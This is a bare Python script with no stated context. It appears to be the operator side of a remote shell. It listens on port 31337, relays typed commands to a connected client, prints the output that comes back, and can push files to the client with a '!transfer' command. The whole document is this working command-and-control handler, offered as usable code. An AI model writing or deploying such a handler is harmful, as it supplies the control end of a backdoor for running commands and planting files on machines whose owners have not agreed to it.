import socket
import os

version = socket.AF_INET # IPV4
proto   = socket.SOCK_STREAM #TCP

sock = socket.socket(version,proto)# Our Socket

sock.bind(("127.0.0.1",31337)) # Bind to a port
sock.listen()   #Listen For connections
while True:    #infinete loop
    con,addr = sock.accept() #Accept Connection
    print("Connecion from: {}".format(addr[0])) #Print name

    command = ""            # empty command
    while True: # wait for exit
        command = input("{}:$".format(addr[0])) #ask for command
        if "!exit" in command:
            con.send("!exit".encode())
            con.close()
            exit()

        #   0         1       2
        #!transfer <path> <dst_path>
        elif "!transfer" in command:
            file_to_send = command.split()[1]
            size = os.stat(file_to_send).st_size
            con.send((command+" "+str(size)).encode())
            with open(file_to_send,"rb") as f:
                data = f.read()
                con.sendall(data)
        else:
            con.send(command.encode()) #send command

            data = con.recv(1024)
            out = data.decode()
            if len(data) >= 1024:
                data = con.recv(1024)
                out += data.decode()
            print(out)
    break


